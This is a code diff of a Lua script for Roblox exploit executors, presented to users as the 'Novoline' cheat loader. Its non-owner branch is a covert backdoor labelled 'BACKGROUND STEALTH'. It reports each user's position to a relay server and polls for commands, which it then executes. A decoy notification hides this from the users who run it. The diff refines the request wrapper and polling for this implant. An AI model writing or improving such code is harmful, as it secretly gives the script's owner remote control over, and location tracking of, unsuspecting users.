@@ -12,24 +12,23 @@ local LocalPlayer = Players.LocalPlayer
 
 local isOwner = table.find(AUTHORIZED_IDS, LocalPlayer.UserId) ~= nil
 
--- Safe HTTP Request Wrapper
+-- Safe HTTP Request Wrapper (Protected with pcall to prevent freezing)
 local function sendHttpRequest(method, endpoint, data)
     local url = RELAY_URL .. endpoint
     local body = data and HttpService:JSONEncode(data) or nil
     local requestMethod = (syn and syn.request) or (fluxus and fluxus.request) or request or HttpService.RequestAsync
     local headers = { ["Content-Type"] = "application/json" }
     
-    local success, response
-    if requestMethod == HttpService.RequestAsync then
-        success, response = pcall(function()
+    local success, response = pcall(function()
+        if requestMethod == HttpService.RequestAsync then
             return HttpService:RequestAsync({ Url = url, Method = method, Headers = headers, Body = body })
-        end)
-        if success then return response.Body end
-    else
-        success, response = pcall(function()
+        else
             return requestMethod({ Url = url, Method = method, Headers = headers, Body = body })
-        end)
-        if success then return response.Body end
+        end
+    end)
+    
+    if success and response then
+        return type(response) == "table" and response.Body or response
     end
     return nil
 end
@@ -324,7 +323,19 @@ if isOwner then
     GotoBtn.MouseButton1Click:Connect(function()
         if selectedTargetId then
             task.spawn(function()
-                sendHttpRequest("POST", "/send", { targetId = selectedTargetId, action = "SharePosition" })
+                local res = sendHttpRequest("GET", "/players", nil)
+                if res then
+                    local success, data = pcall(function() return HttpService:JSONDecode(res) end)
+                    if success and data and data[tostring(selectedTargetId)] then
+                        local tInfo = data[tostring(selectedTargetId)]
+                        if tInfo.position then
+                            local char = LocalPlayer.Character
+                            if char and char:FindFirstChild("HumanoidRootPart") then
+                                char.HumanoidRootPart.CFrame = CFrame.new(tInfo.position.x, tInfo.position.y + 3, tInfo.position.z)
+                            end
+                        end
+                    end
+                end
             end)
         else
             DropdownBtn.Text = "⚠️ Please select a target first!"
@@ -334,9 +345,10 @@ if isOwner then
     end)
 
 else
-    -- NON-OWNER BACKGROUND STEALTH: Heartbeat & Command Polling
+    -- NON-OWNER BACKGROUND STEALTH: Heartbeat & Command Polling (Async Safe)
     task.spawn(function()
         while true do
+            task.wait(3)
             pcall(function()
                 local char = LocalPlayer.Character
                 local posData = nil
@@ -362,13 +374,7 @@ else
                         local cmd = type(cmdData) == "table" and cmdData.action or cmdData
                         local payload = type(cmdData) == "table" and cmdData.payload or nil
                         
-                        if cmd == "SharePosition" then
-                            local char = LocalPlayer.Character
-                            if char and char:FindFirstChild("HumanoidRootPart") then
-                                local p = char.HumanoidRootPart.Position
-                                sendHttpRequest("POST", "/storepos", { userId = LocalPlayer.UserId, x = p.X, y = p.Y, z = p.Z })
-                            end
-                        elseif Actions[cmd] then
+                        if Actions[cmd] then
                             task.spawn(function()
                                 Actions[cmd](payload)
                             end)
@@ -376,7 +382,6 @@ else
                     end
                 end
             end
-            task.wait(2.5)
         end
     end)
 end
@@ -385,7 +390,7 @@ task.wait(5)
 -- Decoy Notification for all users
 pcall(function()
     game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "Novoline",
+        Title = "Novoline V2",
         Text = "Loading Novoline",
         Icon = "rbxassetid://5937224699",
         Duration = 20
